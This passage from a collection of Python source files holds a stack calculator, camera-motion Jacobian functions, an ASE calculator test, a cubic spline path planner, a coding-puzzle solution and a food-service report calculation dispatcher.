/ n))\n\n    def dup(self):\n        cmd = 'dup'\n        self._writeln(cmd)\n\n        if not self._ensure_n(cmd, 1):\n            return\n\n        self.state['calc'].push(self.state['calc'].peek())\n\n    def dupn(self):\n        cmd = 'dupn'\n        self._writeln(cmd)\n\n        if not self._ensure_n(cmd, 1):\n            return\n\n        n = self.state['calc'].pop()\n\n        if len(self.state['calc']) < n or n <= 0:\n            self.state['err'] = self.ERR_TOO_FEW_ARGS.format(cmd)\n            self.state['calc'].push(n)\n            return\n\n        if n > 0:\n            self.state['calc']._storage.extend(self.state['calc']._storage[-n:])\n\n    def dupr(self):\n        cmd = 'dupr'\n        self._writeln(cmd)\n\n        if not self._ensure_n(cmd, 2):\n            return\n\n        len_ = self.state['calc'].pop()\n        pos = self.state['calc'].pop()\n\n        if (\n                len(self.state['calc']) < uint16(pos) or\n                len(self.state['calc']) < uint16(len_) or\n                len(self.state['calc']) < uint16(pos + len_)\n        ):\n            self.state['err'] = self.ERR_INVALID_INPUT\n            self.state['calc'].push(pos)\n            self.state['calc'].push(len_)\n            return\n\n        self.state['calc']._storage.extend(self.state['calc']._storage[-pos:-pos + len_])\n\n        self.state['ret'] = self.NO_HISTORY\n\n    def drop(self):\n        cmd = 'drop'\n        self._writeln(cmd)\n\n        if not self._ensure_n(cmd, 1):\n            return\n\n        self.state['calc'].pop()\n\n    def dropn(self):\n        cmd = 'dropn'\n        self._writeln(cmd)\n\n        if not self._ensure_n(cmd, 1):\n            return\n\n        n = self.state['calc'].pop()\n\n        if len(self.state['calc']) < n or n < 0:\n            self.state['err'] = self.ERR_TOO_FEW_ARGS.format(cmd)\n            self.state['calc'].push(n)\n            return\n\n        for _ in xrange(n):\n            self.state['calc'].pop()\n\n    def min(self):\n        self._binop('min', min)\n\n    def max(self):\n        self._binop('max', max)\n\n    def depth(self):\n        cmd = 'depth'\n        self._writeln(cmd)\n\n        self.state['calc'].push(int32(len(self.state['calc'])))\n\n    def invert(self):\n        cmd = 'ivrt'\n        self._writeln(cmd)\n\n        self.state['calc'].invert()\n\n    def undo(self):\n        cmd = 'undo'\n        self._writeln(cmd)\n\n        if len(self.state['hist']) < 2:\n            self.state['err'] = self.ERR_INVALID_INPUT\n            return\n\n        self.state['calc'] = self.state['hist'].pop()\n        self.state['ret'] = self.NO_HISTORY\n\n    def quit(self):\n        self._writeln('quit')\n        self._readln('Bye bye')\n", "229": "\"\"\"Calculate Jacobians\n\nHas functions returning the derivative of u and v (image plane coordinates) with respect to\nx, y, z, roll, pitch, and yaw (the twist parameters). Also includes a function \n\"calculate_symbolic_derivatives\" that uses SymPy to calculate the form of the derivatives, \nand tests the derivative functions. \n\nThe input to all the derivative functions are:\n    z_calc (float): Calculated depth of point from disparity\n    u1 (int): u coordinate of point in the template image\n    v1 (int): v coordinate of point in the template image\n    f (float): focal length of camera\n    cu (float): the u coordinate of the principle point of the camera\n    cv (float): the v coordinate of the principle point of the camera\n    x (float): the current estimate for translation along the x-axis\n    y (float): the current estimate for translation along the y-axis\n    z (float): the current estimate for translation along the z-axis\n    roll (float): the current estimate for roll angle\n    pitch (float): the current estimate for pitch angle\n    yaw (float): the current estimate for yaw angle\n\"\"\"\n\nfrom math import sin, cos\n# import sympy\n# from sympy.matrices import Matrix, zeros\n\ndef get_dx(z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw):\n    \"\"\"\n    Calculates the derivatives of u and v with respect to x\n\n    Parameters\n    ----------\n    z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw, as explained in module docstring\n    \n    Returns\n    -------\n    du_dx (float): the derivative of u w.r.t. x\n    dv_dx (float): the derivative of v w.r.t. x\n    \"\"\"\n\n    du = f/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch))\n    dv = 0\n\n    return du, dv\n\n\ndef get_dy(z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw):\n    \"\"\"\n    Calculates the derivatives of u and v with respect to y\n\n    Parameters\n    ----------\n    z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw, as explained in module docstring\n    \n    Returns\n    -------\n    du_dy (float): the derivative of u w.r.t. y\n    dv_dy (float): the derivative of v w.r.t. y\n    \"\"\"\n\n    du = 0\n    dv = f/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch))\n\n    return du, dv\n\n\ndef get_dz(z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw):\n    \"\"\"\n    Calculates the derivatives of u and v with respect to z\n\n    Parameters\n    ----------\n    z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw, as explained in module docstring\n    \n    Returns\n    -------\n    du_dz (float): the derivative of u w.r.t. z\n    dv_dz (float): the derivative of v w.r.t. z\n    \"\"\"\n\n    du = -f*(x + z_calc*(sin(pitch)*cos(roll)*cos(yaw) + sin(roll)*sin(yaw)) + (-cu*z_calc/f + u1*z_calc/f)*cos(pitch)*cos(yaw) + (-cv*z_calc/f + v1*z_calc/f)*(sin(pitch)*sin(roll)*cos(yaw) - sin(yaw)*cos(roll)))/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch))**2\n    dv = -f*(y + z_calc*(sin(pitch)*sin(yaw)*cos(roll) - sin(roll)*cos(yaw)) + (-cu*z_calc/f + u1*z_calc/f)*sin(yaw)*cos(pitch) + (-cv*z_calc/f + v1*z_calc/f)*(sin(pitch)*sin(roll)*sin(yaw) + cos(roll)*cos(yaw)))/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch))**2\n\n    return du, dv\n    \n\ndef get_droll(z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw):\n    \"\"\"\n    Calculates the derivatives of u and v with respect to roll\n\n    Parameters\n    ----------\n    z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw, as explained in module docstring\n    \n    Returns\n    -------\n    du_droll (float): the derivative of u w.r.t. roll\n    dv_droll (float): the derivative of v w.r.t. roll\n    \"\"\"\n\n    du = f*(z_calc*(-sin(pitch)*sin(roll)*cos(yaw) + sin(yaw)*cos(roll)) + (-cv*z_calc/f + v1*z_calc/f)*(sin(pitch)*cos(roll)*cos(yaw) + sin(roll)*sin(yaw)))/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch)) + f*(z_calc*sin(roll)*cos(pitch) - (-cv*z_calc/f + v1*z_calc/f)*cos(pitch)*cos(roll))*(x + z_calc*(sin(pitch)*cos(roll)*cos(yaw) + sin(roll)*sin(yaw)) + (-cu*z_calc/f + u1*z_calc/f)*cos(pitch)*cos(yaw) + (-cv*z_calc/f + v1*z_calc/f)*(sin(pitch)*sin(roll)*cos(yaw) - sin(yaw)*cos(roll)))/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch))**2\n    dv = f*(z_calc*(-sin(pitch)*sin(roll)*sin(yaw) - cos(roll)*cos(yaw)) + (-cv*z_calc/f + v1*z_calc/f)*(sin(pitch)*sin(yaw)*cos(roll) - sin(roll)*cos(yaw)))/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch)) + f*(z_calc*sin(roll)*cos(pitch) - (-cv*z_calc/f + v1*z_calc/f)*cos(pitch)*cos(roll))*(y + z_calc*(sin(pitch)*sin(yaw)*cos(roll) - sin(roll)*cos(yaw)) + (-cu*z_calc/f + u1*z_calc/f)*sin(yaw)*cos(pitch) + (-cv*z_calc/f + v1*z_calc/f)*(sin(pitch)*sin(roll)*sin(yaw) + cos(roll)*cos(yaw)))/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch))**2\n\n    return du, dv\n    \n\ndef get_dpitch(z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw):\n    \"\"\"\n    Calculates the derivatives of u and v with respect to pitch\n\n    Parameters\n    ----------\n    z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw, as explained in module docstring\n    \n    Returns\n    -------\n    du_dpitch (float): the derivative of u w.r.t. pitch\n    dv_dpitch (float): the derivative of v w.r.t. pitch\n    \"\"\"\n\n    du = f*(z_calc*sin(pitch)*cos(roll) - (cu*z_calc/f - u1*z_calc/f)*cos(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(pitch)*sin(roll))*(x + z_calc*(sin(pitch)*cos(roll)*cos(yaw) + sin(roll)*sin(yaw)) + (-cu*z_calc/f + u1*z_calc/f)*cos(pitch)*cos(yaw) + (-cv*z_calc/f + v1*z_calc/f)*(sin(pitch)*sin(roll)*cos(yaw) - sin(yaw)*cos(roll)))/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch))**2 + f*(z_calc*cos(pitch)*cos(roll)*cos(yaw) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch)*cos(yaw) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch)*cos(yaw))/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch))\n    dv = f*(z_calc*sin(pitch)*cos(roll) - (cu*z_calc/f - u1*z_calc/f)*cos(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(pitch)*sin(roll))*(y + z_calc*(sin(pitch)*sin(yaw)*cos(roll) - sin(roll)*cos(yaw)) + (-cu*z_calc/f + u1*z_calc/f)*sin(yaw)*cos(pitch) + (-cv*z_calc/f + v1*z_calc/f)*(sin(pitch)*sin(roll)*sin(yaw) + cos(roll)*cos(yaw)))/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch))**2 + f*(z_calc*sin(yaw)*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch)*sin(yaw) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*sin(yaw)*cos(pitch))/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch))\n    \n    return du, dv\n    \n\ndef get_dyaw(z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw):\n    \"\"\"\n    Calculates the derivatives of u and v with respect to yaw\n\n    Parameters\n    ----------\n    z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw, as explained in module docstring\n    \n    Returns\n    -------\n    du_dyaw (float): the derivative of u w.r.t. yaw\n    dv_dyaw (float): the derivative of v w.r.t. yaw\n    \"\"\"\n\n    du = f*(z_calc*(-sin(pitch)*sin(yaw)*cos(roll) + sin(roll)*cos(yaw)) - (-cu*z_calc/f + u1*z_calc/f)*sin(yaw)*cos(pitch) + (-cv*z_calc/f + v1*z_calc/f)*(-sin(pitch)*sin(roll)*sin(yaw) - cos(roll)*cos(yaw)))/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch))\n    dv = f*(z_calc*(sin(pitch)*cos(roll)*cos(yaw) + sin(roll)*sin(yaw)) + (-cu*z_calc/f + u1*z_calc/f)*cos(pitch)*cos(yaw) + (-cv*z_calc/f + v1*z_calc/f)*(sin(pitch)*sin(roll)*cos(yaw) - sin(yaw)*cos(roll)))/(z + z_calc*cos(pitch)*cos(roll) - (-cu*z_calc/f + u1*z_calc/f)*sin(pitch) + (-cv*z_calc/f + v1*z_calc/f)*sin(roll)*cos(pitch))\n\n    return du, dv\n\n\"\"\"\nI have commented out my function to calculate derivatives since SymPy is not one of the included modules. \nHowever, I did not remove it because I believe it demonstrates an important part of my project, the\njacobian calculation.\n\"\"\"\n\n# def calculate_symbolic_derivatives():\n#     \"\"\"\n#     Uses SymPy to calculate the symbolic form of the derivatives used above. \n#     Substitutes a test point to check the derivative functions are all correct. \n#     Does not accept any arguments or return anything, but prints all tests. \n#     \"\"\"\n\n#     # Setting up necessary symbolic variables\n#     z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw = sympy.symbols('z_calc, u1, v1, f, cu, cv, x, y, z, roll, pitch, yaw', real=True)\n\n#     # Calculating u2 and v2, the coordinates of the pixel in the second image\n#     K = Matrix([[f, 0, cu], [0, f, cv], [0, 0, 1]])\n\n#     T = zeros(4, 4)\n#     T[0:3, 3] = Matrix([[x], [y], [z]])\n#     T[3, 3] = 1\n\n#     cr = sympy.cos(roll)\n#     sr = sympy.sin(roll)\n#     cp = sympy.cos(pitch)\n#     sp = sympy.sin(pitch)\n#     cy = sympy.cos(yaw)\n#     sy = sympy.sin(yaw)\n\n#     R = Matrix([[cy*cp, cy*sp*sr - sy*cr, cy*sp*cr + sy*sr],\n#                 [sy*cp, sy*sp*sr + cy*cr, sy*sp*cr - cy*sr],\n#                 [  -sp,            cp*sr,            cp*cr]])\n\n#     T[0:3, 0:3] = R\n\n#     u_initial = Matrix([[u1], [v1], [1]])\n#     p = zeros(4, 1)\n#     p[0:3, 0] = z_calc * K.inv() * u_initial\n#     p[3] = 1\n#     p_trans = T * p\n#     u_trans = K * Matrix([[p_trans[0, 0]/p_trans[2, 0]], [p_trans[1, 0]/p_trans[2, 0]], [1]])\n\n#     u2 = u_trans[0, 0]\n#     v2 = u_trans[1, 0]\n\n#     # Set values for tests\n#     test_values = [(z_calc, 3.66), (u1, 163), (v1, 115), (f, 579.47), (cu, 374.77), (cv, 265.41), (x, 0), (y, -0.12), (z, 0), (roll, 0), (pitch, 0), (yaw, 0)]\n#     test_args = [val[1] for val in test_values]\n\n#     # Confirm u2 and v2 have been calculated correctly\n#     print(u2.subs(test_values), 163)\n#     print(v2.subs(test_values), 96)\n\n#     # Confirm all derivative functions are returning the same value as symbolic functions\n#     print(sympy.diff(u2, x).subs(test_values), get_dx(*test_args)[0])\n#     print(sympy.diff(v2, x).subs(test_values), get_dx(*test_args)[1])\n#     print(sympy.diff(u2, y).subs(test_values), get_dy(*test_args)[0])\n#     print(sympy.diff(v2, y).subs(test_values), get_dy(*test_args)[1])\n#     print(sympy.diff(u2, z).subs(test_values), get_dz(*test_args)[0])\n#     print(sympy.diff(v2, z).subs(test_values), get_dz(*test_args)[1])\n#     print(sympy.diff(u2, roll).subs(test_values), get_droll(*test_args)[0])\n#     print(sympy.diff(v2, roll).subs(test_values), get_droll(*test_args)[1])\n#     print(sympy.diff(u2, pitch).subs(test_values), get_dpitch(*test_args)[0])\n#     print(sympy.diff(v2, pitch).subs(test_values), get_dpitch(*test_args)[1])\n#     print(sympy.diff(u2, yaw).subs(test_values), get_dyaw(*test_args)[0])\n#     print(sympy.diff(v2, yaw).subs(test_values), get_dyaw(*test_args)[1])\n", "230": "def test_calculator_label():\n    from ase.calculators.calculator import Calculator\n\n    calc = Calculator()\n    assert calc.directory == '.'\n    assert calc.prefix is None\n    assert calc.label is None\n\n    calc.label = 'dir/pref'\n    assert calc.directory == 'dir'\n    assert calc.prefix == 'pref'\n    assert calc.label == 'dir/pref'\n\n    calc.label = 'dir2/'\n    assert calc.directory == 'dir2'\n    assert calc.prefix is None\n    assert calc.label == 'dir2/'\n\n    calc.label = 'hello'\n    assert calc.directory == '.'\n    assert calc.prefix == 'hello'\n    assert calc.label == 'hello'\n\n    calc.label = None\n    assert calc.label is None\n    assert calc.prefix is None\n    assert calc.directory == '.'\n", "231": "\"\"\"\ncubic spline planner\n\nAuthor: Atsushi Sakai\n\n\"\"\"\nimport math\nimport numpy as np\nimport bisect\n\n\nclass Spline:\n    u\"\"\"\n    Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.b, self.c, self.d, self.w = [], [], [], []\n\n        self.x = x\n        self.y = y\n\n        self.nx = len(x)  # dimension of x\n        h = np.diff(x)\n\n        # calc coefficient c\n        self.a = [iy for iy in y]\n\n        # calc coefficient c\n        A = self.__calc_A(h)\n        B = self.__calc_B(h)\n        self.c = np.linalg.solve(A, B)\n        #  print(self.c1)\n\n        # calc spline coefficient b and d\n        for i in range(self.nx - 1):\n            self.d.append((self.c[i + 1] - self.c[i]) / (3.0 * h[i]))\n            tb = (self.a[i + 1] - self.a[i]) / h[i] - h[i] * \\\n                (self.c[i + 1] + 2.0 * self.c[i]) / 3.0\n            self.b.append(tb)\n\n    def calc(self, t):\n        u\"\"\"\n        Calc position\n\n        if t is outside of the input x, return None\n\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.a[i] + self.b[i] * dx + \\\n            self.c[i] * dx ** 2.0 + self.d[i] * dx ** 3.0\n\n        return result\n\n    def calcd(self, t):\n        u\"\"\"\n        Calc first derivative\n\n        if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.b[i] + 2.0 * self.c[i] * dx + 3.0 * self.d[i] * dx ** 2.0\n        return result\n\n    def calcdd(self, t):\n        u\"\"\"\n        Calc second derivative\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = 2.0 * self.c[i] + 6.0 * self.d[i] * dx\n        return result\n\n    def __search_index(self, x):\n        u\"\"\"\n        search data segment index\n        \"\"\"\n        return bisect.bisect(self.x, x) - 1\n\n    def __calc_A(self, h):\n        u\"\"\"\n        calc matrix A for spline coefficient c\n        \"\"\"\n        A = np.zeros((self.nx, self.nx))\n        A[0, 0] = 1.0\n        for i in range(self.nx - 1):\n            if i != (self.nx - 2):\n                A[i + 1, i + 1] = 2.0 * (h[i] + h[i + 1])\n            A[i + 1, i] = h[i]\n            A[i, i + 1] = h[i]\n\n        A[0, 1] = 0.0\n        A[self.nx - 1, self.nx - 2] = 0.0\n        A[self.nx - 1, self.nx - 1] = 1.0\n        #  print(A)\n        return A\n\n    def __calc_B(self, h):\n        u\"\"\"\n        calc matrix B for spline coefficient c\n        \"\"\"\n        B = np.zeros(self.nx)\n        for i in range(self.nx - 2):\n            B[i + 1] = 3.0 * (self.a[i + 2] - self.a[i + 1]) / \\\n                h[i + 1] - 3.0 * (self.a[i + 1] - self.a[i]) / h[i]\n        #  print(B)\n        return B\n\n\nclass Spline2D:\n    u\"\"\"\n    2D Cubic Spline class\n\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.s = self.__calc_s(x, y)\n        self.sx = Spline(self.s, x)\n        self.sy = Spline(self.s, y)\n\n    def __calc_s(self, x, y):\n        dx = np.diff(x)\n        dy = np.diff(y)\n        self.ds = [math.sqrt(idx ** 2 + idy ** 2)\n                   for (idx, idy) in zip(dx, dy)]\n        s = [0]\n        s.extend(np.cumsum(self.ds))\n        return s\n\n    def calc_position(self, s):\n        u\"\"\"\n        calc position\n        \"\"\"\n        x = self.sx.calc(s)\n        y = self.sy.calc(s)\n\n        return x, y\n\n    def calc_curvature(self, s):\n        u\"\"\"\n        calc curvature\n        \"\"\"\n        dx = self.sx.calcd(s)\n        ddx = self.sx.calcdd(s)\n        dy = self.sy.calcd(s)\n        ddy = self.sy.calcdd(s)\n        k = (ddy * dx - ddx * dy) / (dx ** 2 + dy ** 2)\n        return k\n\n    def calc_yaw(self, s):\n        u\"\"\"\n        calc yaw\n        \"\"\"\n        dx = self.sx.calcd(s)\n        dy = self.sy.calcd(s)\n        yaw = math.atan2(dy, dx)\n        return yaw\n\n\nclass Spline3D:\n    \"\"\"\n    3D Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y, z):\n        self.s = self.__calc_s(x, y, z)\n        self.sx = Spline(self.s, x)\n        self.sy = Spline(self.s, y)\n        self.sz = Spline(self.s, z)\n\n    def __calc_s(self, x, y, z):\n        dx = np.diff(x)\n        dy = np.diff(y)\n        dz = np.diff(z)\n        self.ds = [math.sqrt(idx ** 2 + idy ** 2 + idz ** 2) for (idx, idy, idz) in zip(dx, dy, dz)]\n        s = [0]\n        s.extend(np.cumsum(self.ds))\n        return s\n\n    def calc_position(self, s):\n        u\"\"\"\n        calc position\n        \"\"\"\n        x = self.sx.calc(s)\n        y = self.sy.calc(s)\n        z = self.sz.calc(s)\n        return x, y, z\n\n    def calc_curvature(self, s):\n        u\"\"\"\n        calc curvature\n        \"\"\"\n        dx = self.sx.calcd(s)\n        ddx = self.sx.calcdd(s)\n        dy = self.sy.calcd(s)\n        ddy = self.sy.calcdd(s)\n        k = (ddy * dx - ddx * dy) / (dx ** 2 + dy ** 2)\n        return k\n\n    def calc_yaw(self, s):\n        u\"\"\"\n        calc yaw\n        \"\"\"\n        dx = self.sx.calcd(s)\n        dy = self.sy.calcd(s)\n        yaw = math.atan2(dy, dx)\n        return yaw\n\n    def calc_pitch(self, s):\n        \"\"\"\n        calc pitch - this function needs to be double checked\n        \"\"\"\n        dx = self.sx.calcd(s)\n        dz = self.sz.calcd(s)\n        pitch = math.atan2(dz, dx)\n        return pitch\n\n\ndef calc_spline_course(x, y, ds=0.1):\n    sp = Spline2D(x, y)\n    s = list(np.arange(0, sp.s[-1], ds))\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    return rx, ry, ryaw, rk, s\n\n\ndef main():\n    print(\"Spline 2D test\")\n    import matplotlib.pyplot as plt\n    x = [0.0, 2.5, 5.0, 7.5, 10.0, 12.5, 15.0, 17.5, 20.0]\n    y = [0.0, 0.0, 3.0, 3.0, 3.0, 3.0, 3.0, 3.0, 3.0]\n\n    sp = Spline2D(x, y)\n    s = np.arange(0, sp.s[-1], 0.1)\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    flg, ax = plt.subplots(1)\n    plt.plot(x, y, \"xb\", label=\"input\")\n    plt.plot(rx, ry, \"-r\", label=\"spline\")\n    plt.grid(True)\n    plt.axis(\"equal\")\n    plt.xlabel(\"x[m]\")\n    plt.ylabel(\"y[m]\")\n    plt.legend()\n\n    flg, ax = plt.subplots(1)\n    plt.plot(s, [math.degrees(iyaw) for iyaw in ryaw], \"-r\", label=\"yaw\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"yaw angle[deg]\")\n\n    flg, ax = plt.subplots(1)\n    plt.plot(s, rk, \"-r\", label=\"curvature\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"curvature [1/m]\")\n\n    plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "232": "#\uc2dc\uac04 \ucd08\uacfc\n# def solution(N, stages):\n#     answer = []\n\n#     calcFauilure = [[0 for i in range(2)] for j in range(N)]\n#     for i in range(1,N+1):\n#         tempReach = 0\n#         tempFauilure = 0\n#         calcFauilure[i-1][0] = i\n#         for player in stages:\n#             if i <= int(player):\n#                 tempReach += 1\n#             if i == int(player):\n#                 tempFauilure += 1\n#         if tempReach == 0:\n#             calcFauilure[i-1][1] = 0\n#         else:\n#             calcFauilure[i-1][1] = tempFauilure/tempReach\n#     calcFauilure = sorted(calcFauilure, key = lambda x: (-x[1], x[0]))\n\n#     for i in range(len(calcFauilure)):\n#         answer.append(calcFauilure[i][0])\n\n#     return answer\n\ndef solution(N, stages):\n    dic = {}\n    n = len(stages)\n    for i in range(1,N+1):\n        if stages.count(i) == 0 : \n            dic[i] = 0 \n            continue\n        item = stages.count(i)/n\n        n-=stages.count(i)\n        dic[i] = item\n    return sorted(dic, key=lambda k : dic[k], reverse = True)\n\ntestN = 5\ntestStage = [2, 1, 2, 6, 2, 4, 3, 3]\nprint(solution(testN,testStage))\n", "233": "from .services.data_service import DataService, KEY_SERVICE, KEY_MEMBER, KEY_FAMILY\n\nimport transform_layer.calc_service_types as calc_service_types\nimport transform_layer.calc_families as calc_families\nimport transform_layer.calc_fact_services as calc_fact_services\nimport transform_layer.calc_new_families as calc_new_families\nimport transform_layer.calc_geographies as calc_geographies\nimport transform_layer.calc_service_trends as calc_service_trends\nimport transform_layer.calc_family_members as calc_family_members\n\nimport pandas as pd\n\nBIG_NUM_NAMES = [\"services_total\", \"undup_hh_total\", \"undup_indv_total\", \"services_per_uhh_avg\"]\nDEFAULT_CTRL = \"Is Grocery Service\"\nDEFAULT_AGE_GROUP_ID = 8\n\nclass CalculationDispatcher:\n    def __init__(self, request):\n\n        # now on construction, it will automatically run parse request on the input request, so theres no extra in between step\n        self.request = self.parse_request(request)\n        data_list = request[\"ReportInfo\"]\n        self.params = request[\"Meta\"]\n        self.data_dict = CalculationDispatcher.__group_by_data_def(data_list)\n        self.data_service = DataService(request[\"Meta\"])\n        \n    @staticmethod\n    def __group_by_data_def(data_list):\n        \"\"\"Returns dict of data defs grouped by reportDictid and sorted by dataDefid\n        \n        data_dict is a dictionary that groups the data definitions in data_list by reportDictId\n        and sorts the data definitions in each group by their dataDefId, highest to smallest.\n        Does not modify data_list.\n        data_dict = { \n            1: [{\"reportDictId\": 1, \"dataDefId\": 1 },   {\"reportDictId\": 1, \"dataDefId\": 2 }, ... ],\n            2:  [{\"reportDictId\": 2, \"dataDefId\": 5 },   {\"reportDictId\": 2, \"dataDefId\": 6 }, ... ],\n            3:  [{\"reportDictId\": 3, \"dataDefId\": 19 },   {\"reportDictId\": 3, \"dataDefId\": 20 }, ... ],\n        }\n        \n        \"\"\"\n\n        data_dict = {}\n        for item in data_list:\n            entry_list = data_dict.get(item[\"reportDictId\"])\n            if entry_list is None:\n                pos = item[\"reportDictId\"]\n                data_dict[pos] = [item]\n            else:\n                entry_list.append(item)\n\n        for entry_list in data_dict.values():\n            entry_list.sort(key = lambda e: e[\"dataDefId\"])\n        return data_dict\n        \n    \n    #runs calculation on each data_def in data_dict\n    #and appends the result of the calculation to the data_def\n    #modifies: self.request\n    #returns the modified data_defs as a list\n    def run_calculations(self):\n        for group in self.data_dict.values():\n            for data_def in group:\n                data = self.data_service.get_data_for_definition(data_def[\"dataDefId\"])\n                if self.has_data(data):\n                    self.params[\"no_data\"] = False\n                    func = data_calc_function_switcher[data_def[\"dataDefId\"]]\n                    data_def[\"value\"] = func(data)\n                else:\n                    self.params[\"no_data\"] = True\n\n        return self.request[\"ReportInfo\"]\n\n    # static callable parse request\n    @staticmethod\n    def parse_request(input_dict):\n        # Setting the scope type\n        scope_field = input_dict[\"Meta\"][\"scope_field\"]\n        if scope_field.startswith(\"fip\"):\n            input_dict[\"Meta\"][\"scope_type\"] = \"geography\"\n        else:\n            input_dict[\"Meta\"][\"scope_type\"] = \"hierarchy\"\n        \n        # Setting the control type\n        if \"control_type_name\" not in input_dict[\"Meta\"]:\n            input_dict[\"Meta\"][\"control_type_name\"] = DEFAULT_CTRL\n\n        if \"control_age_group_id\" not in input_dict[\"Meta\"]:\n            input_dict[\"Meta\"][\"control_age_group_id\"] = DEFAULT_AGE_GROUP_ID\n\n        return input_dict\n\n    @staticmethod\n    def has_data(data):\n        if isinstance(data, pd.DataFrame):\n            return not(len(data) == 0)\n        elif type(data) is dict:\n            keys_to_look_for = [KEY_SERVICE, KEY_FAMILY, KEY_MEMBER]\n            any_empty = False\n            i = 0\n            while(i < len(keys_to_look_for) and not(any_empty)):\n                key = keys_to_look_for[i]\n                data_frame = data.get(key)\n                if data_frame is not None:\n                    if isinstance(data_frame, pd.DataFrame):\n                        any_empty = any_empty or (len(data_frame) == 0)\n                    else: \n                        #only dataframes should be stored in the \n                        #dictionary of data passed to the calculations\n                        any_empty = True\n                i += 1\n            return not(any_empty)\n        else:\n            return False\n\ndata_calc_function_switcher = {\n        1: calc_fact_services.get_services_total,\n        2: calc_fact_services.get_undup_hh_total,\n        3: calc_fact_services.get_undup_indv_total,\n        4: calc_fact_services.get_services_per_uhh_avg,\n        5: calc_fact_services.get_wminor,\n        6: calc_fact_services.get_wominor,\n        7: calc_fact_services.get_services_total,\n        8: calc_fact_services.get_indv_sen_hh_wminor,\n        9: calc_fact_services.get_indv_sen_hh_wominor,\n        10: calc_fact_services.get_sen_total,\n        11: calc_fact_services.get_adult_wminor,\n        12: calc_fact_services.get_adult_wominor,\n        13: calc_fact_services.get_adult,\n        14: calc_fact_services.get_indv_child_hh_wminor,\n        15: calc_fact_services.get_indv_child_hh_wominor,\n        16: calc_fact_services.get_indv_child_total,\n        17: 